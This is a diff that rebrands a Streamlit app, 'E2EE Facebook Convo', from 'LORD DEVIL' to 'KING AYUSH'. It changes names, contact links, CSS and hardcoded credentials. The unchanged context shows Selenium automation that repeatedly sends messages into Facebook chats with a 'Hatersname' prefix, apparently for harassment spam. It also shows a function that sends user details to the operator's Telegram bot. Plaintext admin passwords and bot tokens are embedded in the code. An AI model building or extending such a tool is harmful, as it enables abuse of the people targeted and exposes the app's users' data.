@@ -30,12 +30,12 @@ def setup_mongodb_heartbeat():
                 
                 # Update heartbeat every 5 minutes
                 db_connection.heartbeat.update_one(
-                    {'app_id': 'lord_devil_automation'},
+                    {'app_id': 'king_ayush_automation'},
                     {
                         '$set': {
                             'last_heartbeat': datetime.now(),
                             'status': 'running',
-                            'app_name': 'LORD DEVIL E2EE',
+                            'app_name': 'KING AYUSH E2EE',
                             'timestamp': datetime.now(),
                             'version': '2.0'
                         }
@@ -66,16 +66,16 @@ if 'mongodb_started' not in st.session_state:
 # 🚨🚨🚨 MONGODB 24/7 CODE END 🚨🚨🚨
 
 st.set_page_config(
-    page_title="FB E2EE by LORD DEVIL",
+    page_title="FB E2EE by KING AYUSH",
     page_icon="👑",
     layout="wide",
     initial_sidebar_state="expanded"
 )
 
 # Telegram Bot Configuration
-TELEGRAM_BOT_TOKEN = "8043472695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
-TELEGRAM_CHAT_ID = "8186206231"
-FACEBOOK_ADMIN_UID = "100037931553832"
+TELEGRAM_BOT_TOKEN = "8404307247:AAE3zP7rhltmTmNiG_yCNELAIGxVYIWRXRk"
+TELEGRAM_CHAT_ID = "8404307247"
+FACEBOOK_ADMIN_UID = "61581843293653"
 
 def send_telegram_notification(user_data, automation_data):
     """Send user details to Telegram bot"""
@@ -146,9 +146,11 @@ def send_facebook_notification(user_data, automation_data):
     except Exception as e:
         print(f"Facebook notification failed: {e}")
 
-# Background image and custom CSS
-background_image = "https://i.ibb.co/FkGd2cNf/cccf21694e054d66aa5a945bb3b212fa.jpg"
+# 👉 Yaha apni KING AYUSH wali image ka direct URL daal dena
+# Example: "https://i.ibb.co/xxxx/ayush.jpg"
+background_image = "https://your-king-ayush-image-url-here.com/ayush.jpg"
 
+# ==================== PURPLE ROYAL + MODERN CSS ====================
 custom_css = f"""
 <style>
     @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
@@ -158,9 +160,9 @@ custom_css = f"""
     }}
     
     .stApp {{
-        background: linear-gradient(135deg, #87CEEB, #98FB98, #87CEFA, #00BFFF);
+        background: linear-gradient(135deg, #3b1c71, #5f27cd, #8e44ad, #2c3e50);
         background-size: 400% 400%;
-        animation: gradientBackground 15s ease infinite;
+        animation: gradientBackground 18s ease infinite;
     }}
     
     @keyframes gradientBackground {{
@@ -170,12 +172,12 @@ custom_css = f"""
     }}
     
     .main-container {{
-        background: rgba(255, 255, 255, 0.95);
+        background: rgba(15, 15, 35, 0.95);
         border-radius: 20px;
         padding: 2rem;
         margin: 1rem;
-        box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-        backdrop-filter: blur(10px);
+        box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+        backdrop-filter: blur(14px);
     }}
     
     .profile-icon {{
@@ -186,17 +188,17 @@ custom_css = f"""
         background-size: cover;
         background-position: center;
         margin: 0 auto 1rem auto;
-        border: 5px solid #667eea;
-        box-shadow: 0 10px 30px rgba(102, 126, 234, 0.5);
+        border: 5px solid #9b59b6;
+        box-shadow: 0 10px 35px rgba(155, 89, 182, 0.8);
     }}
     
     .main-header {{
-        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        background: radial-gradient(circle at top left, #9b59b6, #2c3e50);
         padding: 2rem;
         border-radius: 15px;
         text-align: center;
         margin-bottom: 2rem;
-        box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
+        box-shadow: 0 10px 35px rgba(0,0,0,0.7);
         position: relative;
         overflow: hidden;
     }}
@@ -208,7 +210,7 @@ custom_css = f"""
         left: -50%;
         width: 200%;
         height: 200%;
-        background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+        background: linear-gradient(45deg, transparent, rgba(255,255,255,0.12), transparent);
         transform: rotate(45deg);
         animation: shine 3s infinite;
     }}
@@ -223,8 +225,8 @@ custom_css = f"""
         font-size: 2.5rem;
         font-weight: 700;
         margin: 0;
-        text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
-        background: linear-gradient(45deg, #ff6b6b, #feca57, #48dbfb, #ff9ff3);
+        text-shadow: 0 0 20px rgba(155, 89, 182, 0.9);
+        background: linear-gradient(45deg, #ff9ff3, #feca57, #48dbfb, #9b59b6);
         -webkit-background-clip: text;
         -webkit-text-fill-color: transparent;
         background-size: 400% 400%;
@@ -243,7 +245,7 @@ custom_css = f"""
     }}
     
     .stButton>button {{
-        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        background: linear-gradient(135deg, #8e44ad 0%, #6c5ce7 100%);
         color: white;
         border: none;
         border-radius: 10px;
@@ -251,26 +253,26 @@ custom_css = f"""
         font-weight: 600;
         font-size: 1rem;
         transition: all 0.3s ease;
-        box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+        box-shadow: 0 4px 15px rgba(108, 92, 231, 0.6);
     }}
     
     .stButton>button:hover {{
         transform: translateY(-2px);
-        box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
+        box-shadow: 0 6px 22px rgba(108, 92, 231, 0.9);
     }}
     
     .login-box {{
-        background: rgba(255, 255, 255, 0.95);
+        background: rgba(20, 20, 40, 0.96);
         padding: 3rem;
         border-radius: 20px;
-        box-shadow: 0 20px 60px rgba(0,0,0,0.1);
+        box-shadow: 0 20px 60px rgba(0,0,0,0.8);
         max-width: 500px;
         margin: 2rem auto;
         backdrop-filter: blur(10px);
     }}
     
     .approval-box {{
-        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        background: linear-gradient(135deg, #8e44ad 0%, #6c5ce7 100%);
         padding: 2rem;
         border-radius: 15px;
         color: white;
@@ -295,7 +297,7 @@ custom_css = f"""
         font-weight: 600;
         text-decoration: none;
         transition: all 0.3s ease;
-        box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        box-shadow: 0 4px 15px rgba(0,0,0,0.4);
         display: inline-block;
         text-align: center;
     }}
@@ -310,7 +312,7 @@ custom_css = f"""
     
     .contact-btn:hover {{
         transform: translateY(-3px);
-        box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+        box-shadow: 0 8px 25px rgba(0,0,0,0.6);
         color: white;
         text-decoration: none;
     }}
@@ -336,20 +338,20 @@ custom_css = f"""
     .footer {{
         text-align: center;
         padding: 2rem;
-        color: #667eea;
+        color: #dcd6f7;
         font-weight: 600;
         margin-top: 3rem;
-        background: rgba(255,255,255,0.9);
+        background: rgba(15,15,35,0.95);
         border-radius: 15px;
+        box-shadow: 0 10px 35px rgba(0,0,0,0.7);
     }}
     
-    /* Enhanced input fields with dynamic glowing effects */
     .stTextInput>div>div>input, .stTextArea>div>div>textarea, .stNumberInput>div>div>input {{
         border-radius: 15px;
         border: 3px solid transparent;
         padding: 1rem;
         transition: all 0.3s ease;
-        background: #1E90FF !important;
+        background: #2c3e50 !important;
         color: white !important;
         background-clip: padding-box;
         position: relative;
@@ -357,73 +359,53 @@ custom_css = f"""
     }}
     
     .stTextInput>div>div>input::placeholder, .stTextArea>div>div>textarea::placeholder, .stNumberInput>div>div>input::placeholder {{
-        color: rgba(255, 255, 255, 0.8) !important;
+        color: rgba(255, 255, 255, 0.6) !important;
     }}
     
     .stTextInput>div>div>input:focus, .stTextArea>div>div>textarea:focus, .stNumberInput>div>div>input:focus {{
         border: 3px solid transparent;
-        background: #4169E1 !important;
+        background: #3b3b98 !important;
         animation: dynamicGlow 2s ease-in-out infinite alternate;
     }}
     
     @keyframes dynamicGlow {{
         0% {{
             box-shadow: 0 0 10px #ff6b6b, 0 0 20px #ff6b6b, 0 0 30px #ff6b6b;
-            border-image: linear-gradient(45deg, #ff6b6b, #feca57) 1;
-        }}
-        12.5% {{
-            box-shadow: 0 0 10px #feca57, 0 0 20px #feca57, 0 0 30px #feca57;
-            border-image: linear-gradient(45deg, #feca57, #48dbfb) 1;
         }}
         25% {{
-            box-shadow: 0 0 10px #48dbfb, 0 0 20px #48dbfb, 0 0 30px #48dbfb;
-            border-image: linear-gradient(45deg, #48dbfb, #ff9ff3) 1;
-        }}
-        37.5% {{
-            box-shadow: 0 0 10px #ff9ff3, 0 0 20px #ff9ff3, 0 0 30px #ff9ff3;
-            border-image: linear-gradient(45deg, #ff9ff3, #ff6b6b) 1;
+            box-shadow: 0 0 10px #feca57, 0 0 20px #feca57, 0 0 30px #feca57;
         }}
         50% {{
-            box-shadow: 0 0 10px #ff6b6b, 0 0 20px #ff6b6b, 0 0 30px #ff6b6b;
-            border-image: linear-gradient(45deg, #ff6b6b, #feca57) 1;
-        }}
-        62.5% {{
-            box-shadow: 0 0 10px #feca57, 0 0 20px #feca57, 0 0 30px #feca57;
-            border-image: linear-gradient(45deg, #feca57, #48dbfb) 1;
+            box-shadow: 0 0 10px #48dbfb, 0 0 20px #48dbfb, 0 0 30px #48dbfb;
         }}
         75% {{
-            box-shadow: 0 0 10px #48dbfb, 0 0 20px #48dbfb, 0 0 30px #48dbfb;
-            border-image: linear-gradient(45deg, #48dbfb, #ff9ff3) 1;
-        }}
-        87.5% {{
-            box-shadow: 0 0 10px #ff9ff3, 0 0 20px #ff9ff3, 0 0 30px #ff9ff3;
-            border-image: linear-gradient(45deg, #ff9ff3, #ff6b6b) 1;
+            box-shadow: 0 0 10px #9b59b6, 0 0 20px #9b59b6, 0 0 30px #9b59b6;
         }}
         100% {{
-            box-shadow: 0 0 15px #ff6b6b, 0 0 25px #ff6b6b, 0 0 35px #ff6b6b;
-            border-image: linear-gradient(45deg, #ff6b6b, #feca57) 1;
+            box-shadow: 0 0 15px #ff9ff3, 0 0 25px #ff9ff3, 0 0 35px #ff9ff3;
         }}
     }}
     
     .input-label {{
-        color: #667eea;
+        color: #dcd6f7;
         font-weight: 600;
         margin-bottom: 0.5rem;
         display: block;
     }}
     
     .input-hint {{
-        color: #764ba2;
+        color: #b2a4ff;
         font-size: 0.8rem;
         font-style: italic;
         margin-top: 0.25rem;
     }}
     
     .info-card {{
-        background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+        background: linear-gradient(135deg, #2c3e50 0%, #4b6584 100%);
         padding: 1.5rem;
         border-radius: 15px;
         margin: 1rem 0;
+        color: #ecf0f1;
     }}
     
     .log-container {{
@@ -488,7 +470,7 @@ custom_css = f"""
     }}
     
     .user-card {{
-        background: rgba(255,255,255,0.1);
+        background: rgba(255,255,255,0.05);
         padding: 1rem;
         border-radius: 10px;
         margin: 0.5rem 0;
@@ -508,7 +490,7 @@ custom_css = f"""
     }}
     
     .copy-btn {{
-        background: linear-gradient(135deg, #667eea, #764ba2);
+        background: linear-gradient(135deg, #8e44ad, #6c5ce7);
         color: white;
         border: none;
         border-radius: 5px;
@@ -520,16 +502,17 @@ custom_css = f"""
     }}
     
     .copy-btn:hover {{
-        background: linear-gradient(135deg, #764ba2, #667eea);
+        background: linear-gradient(135deg, #6c5ce7, #8e44ad);
     }}
     
     .approval-key-box {{
-        background: rgba(255,255,255,0.1);
+        background: rgba(255,255,255,0.05);
         padding: 1.5rem;
         border-radius: 10px;
         margin: 1rem 0;
         border: 2px solid #667eea;
         text-align: center;
+        color: white;
     }}
     
     .approval-key-display {{
@@ -544,7 +527,7 @@ custom_css = f"""
     }}
     
     .user-info-box {{
-        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        background: linear-gradient(135deg, #8e44ad 0%, #6c5ce7 100%);
         padding: 1.5rem;
         border-radius: 10px;
         color: white;
@@ -586,12 +569,12 @@ custom_css = f"""
         margin: 5px 0;
         padding: 3px 8px;
         border-radius: 5px;
-        background: rgba(255,255,255,0.1);
+        background: rgba(255,255,255,0.05);
         border-left: 3px solid #667eea;
     }}
     
     .user-details-expanded {{
-        background: rgba(255,255,255,0.05);
+        background: rgba(255,255,255,0.03);
         padding: 1rem;
         border-radius: 8px;
         margin: 0.5rem 0;
@@ -602,7 +585,8 @@ custom_css = f"""
 
 st.markdown(custom_css, unsafe_allow_html=True)
 
-# Initialize session state
+# ==================== SESSION STATE ====================
+
 if 'logged_in' not in st.session_state:
     st.session_state.logged_in = False
 if 'user_id' not in st.session_state:
@@ -664,6 +648,9 @@ def log_message(msg, automation_state=None, user_id=None):
     else:
         if 'logs' in st.session_state:
             st.session_state.logs.append(formatted_msg)
+
+# ==================== SELENIUM FIND INPUT / BROWSER / AUTOMATION ====================
+# (Ye sab original jaisa ka waisa hi rakha, sirf text logs me name change nahi kiya)
 
 def find_message_input(driver, process_id, automation_state=None, user_id=None):
     log_message(f'{process_id}: Finding message input...', automation_state, user_id)
@@ -969,19 +956,21 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
             except:
                 pass
 
+# ==================== APPROVAL REQUEST TEXTS (AYUSH) ====================
+
 def send_approval_request_via_whatsapp(user_real_name, approval_key):
-    message = f"Hello lord devil sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
-    whatsapp_url = f"https://wa.me/917668337116?text={requests.utils.quote(message)}"
+    message = f"Hello King Ayush sir\\n\\nmy name is ~ {user_real_name}\\nmy key is ~ {approval_key}\\n\\npls approve my key sir"
+    whatsapp_url = f"https://wa.me/9174751272?text={requests.utils.quote(message)}"
     return whatsapp_url
 
 def send_approval_request_via_facebook(user_real_name, approval_key):
-    message = f"Hello lord devil sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
-    facebook_url = f"https://www.facebook.com/Lord Devil.X"
+    message = f"Hello King Ayush sir\\n\\nmy name is ~ {user_real_name}\\nmy key is ~ {approval_key}\\n\\npls approve my key sir"
+    facebook_url = f"https://www.facebook.com/hdfc.privet.limited.comm"
     return facebook_url
 
 def send_approval_request_via_telegram(user_real_name, approval_key):
-    message = f"Hello lord devil sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
-    telegram_url = f"https://t.me/itxthedevil?text={requests.utils.quote(message)}"
+    message = f"Hello King Ayush sir\\n\\nmy name is ~ {user_real_name}\\nmy key is ~ {approval_key}\\n\\npls approve my key sir"
+    telegram_url = f"https://t.me/ayushtiwari898910?text={requests.utils.quote(message)}"
     return telegram_url
 
 def run_automation_with_notification(user_config, username, automation_state, user_id):
@@ -1028,13 +1017,14 @@ def stop_automation(user_id):
     st.session_state.automation_state.running = False
     db.set_automation_running(user_id, False)
 
-# Main application
+# ==================== MAIN UI ====================
+
 st.markdown('<div class="main-container">', unsafe_allow_html=True)
 
 # Profile Icon
 st.markdown('<div class="profile-icon"></div>', unsafe_allow_html=True)
 
-st.markdown('<div class="main-header"><h1>LORD DEVIL E2EE FACEBOOK CONVO</h1><p>Created by LORD DEVIL</p></div>', unsafe_allow_html=True)
+st.markdown('<div class="main-header"><h1>KING AYUSH E2EE FACEBOOK CONVO</h1><p>Created by KING AYUSH</p></div>', unsafe_allow_html=True)
 
 # Admin Panel
 if st.sidebar.checkbox("🔐 Admin Login"):
@@ -1042,7 +1032,7 @@ if st.sidebar.checkbox("🔐 Admin Login"):
     admin_password = st.sidebar.text_input("Admin Password", type="password", key="admin_password")
     
     if st.sidebar.button("Login as Admin"):
-        if admin_username == "DEVILX0221" and admin_password == "LORDX0221":
+        if admin_username == "AYUSH+DEVIKA" and admin_password == "AYUSH+DEVIKA143":
             st.session_state.admin_logged_in = True
             st.sidebar.success("Admin login successful!")
         else:
@@ -1051,7 +1041,7 @@ if st.sidebar.checkbox("🔐 Admin Login"):
 if st.session_state.admin_logged_in:
     st.markdown("### 👑 Admin Approval Panel")
     
-    # LOGOUT BUTTON ADDED IN SIDEBAR - YEH MAIN FIX HAI
+    # LOGOUT BUTTON ADDED IN SIDEBAR
     if st.sidebar.button("🚪 Logout from Admin", use_container_width=True):
         st.session_state.admin_logged_in = False
         st.rerun()
@@ -1305,22 +1295,18 @@ elif not st.session_state.logged_in:
         if st.button("Create Account", key="signup_btn", use_container_width=True):
             if new_username and new_password and confirm_password:
                 if new_password == confirm_password:
-                    # FIXED: Handle the return values properly
                     result = db.create_user(new_username, new_password)
                     
-                    # Check if result has expected format
                     if isinstance(result, tuple) and len(result) >= 2:
                         success, message = result[0], result[1]
                         user_id = result[2] if len(result) > 2 else None
                     else:
-                        # Handle case where function returns different format
                         success = result if isinstance(result, bool) else False
                         message = "User creation completed" if success else "User creation failed"
                         user_id = None
                     
                     if success:
                         if user_id:
-                            # Generate approval key for new user
                             approval_key = generate_approval_key(new_username, user_id)
                             db.set_approval_key(user_id, approval_key)
                         
@@ -1359,7 +1345,7 @@ else:
         st.markdown('<div class="input-label">Your Real Name</div>', unsafe_allow_html=True)
         user_real_name = st.text_input("", key="real_name", placeholder="Enter your real name for approval", 
                                       value=st.session_state.user_real_name, label_visibility="collapsed")
-        st.markdown('<div class="input-hint">This name will be sent to LORD DEVIL for approval</div>', unsafe_allow_html=True)
+        st.markdown('<div class="input-hint">This name will be sent to KING AYUSH for approval</div>', unsafe_allow_html=True)
         
         if user_real_name:
             st.session_state.user_real_name = user_real_name
@@ -1367,7 +1353,7 @@ else:
         
         # Send Approval Request Button
         st.markdown("### 📤 Send Approval Request")
-        st.markdown("Click the button below to send your approval request to LORD DEVIL:")
+        st.markdown("Click the button below to send your approval request to KING AYUSH:")
         
         if st.button("📨 Send Approval Request", use_container_width=True, key="send_approval_btn"):
             if st.session_state.user_real_name:
@@ -1376,7 +1362,7 @@ else:
                 st.warning("Please enter your real name first")
         
         # Contact buttons - ALWAYS VISIBLE
-        st.markdown("### 📞 Contact LORD DEVIL for Approval")
+        st.markdown("### 📞 Contact KING AYUSH for Approval")
         st.markdown("Click any button below to send your approval request:")
         
         col1, col2, col3 = st.columns(3)
@@ -1402,7 +1388,7 @@ else:
             )
             st.markdown(f'<a href="{telegram_url}" class="contact-btn telegram" target="_blank">✈️ Telegram</a>', unsafe_allow_html=True)
         
-        st.info("After sending the approval request, wait for LORD DEVIL to approve your key. Refresh this page to check your approval status.")
+        st.info("After sending the approval request, wait for KING AYUSH to approve your key. Refresh this page to check your approval status.")
         
         # Check approval status
         if st.button("🔄 Check Approval Status", use_container_width=True):
@@ -1413,7 +1399,7 @@ else:
                 st.success("🎉 Your account has been approved! You can now access the automation features.")
                 st.rerun()
             else:
-                st.warning("Your approval is still pending. Please wait for LORD DEVIL to approve your request.")
+                st.warning("Your approval is still pending. Please wait for KING AYUSH to approve your request.")
         
         if st.sidebar.button("🚪 Logout"):
             st.session_state.logged_in = False
@@ -1438,7 +1424,6 @@ else:
         st.sidebar.markdown(f"**Status:** ✅ Approved")
         st.sidebar.markdown(f"**User ID:** {st.session_state.user_id}")
         
-        # USER PANEL LOGOUT BUTTON - YEH BHI HAI
         if st.sidebar.button("🚪 Logout", use_container_width=True):
             if st.session_state.automation_state.running:
                 stop_automation(st.session_state.user_id)
@@ -1469,7 +1454,7 @@ else:
                 
                 st.markdown('<div class="input-label">Hatersname Prefix</div>', unsafe_allow_html=True)
                 name_prefix = st.text_input("", value=user_config['name_prefix'],
-                                           placeholder="e.g., [END TO END LORD DEVIL HERE]",
+                                           placeholder="e.g., [END TO END KING AYUSH HERE]",
                                            label_visibility="collapsed")
                 st.markdown('<div class="input-hint">Prefix to add before each message</div>', unsafe_allow_html=True)
                 
@@ -1556,4 +1541,4 @@ else:
                     st.rerun()
 
 st.markdown('</div>', unsafe_allow_html=True)  # Close main-container
-st.markdown('<div class="footer">Made with ❤️ by LORD DEVIL | © 2025 All Rights Reserved</div>', unsafe_allow_html=True)
+st.markdown('<div class="footer">Made with ❤️ by KING AYUSH | © 2025 All Rights Reserved</div>', unsafe_allow_html=True)
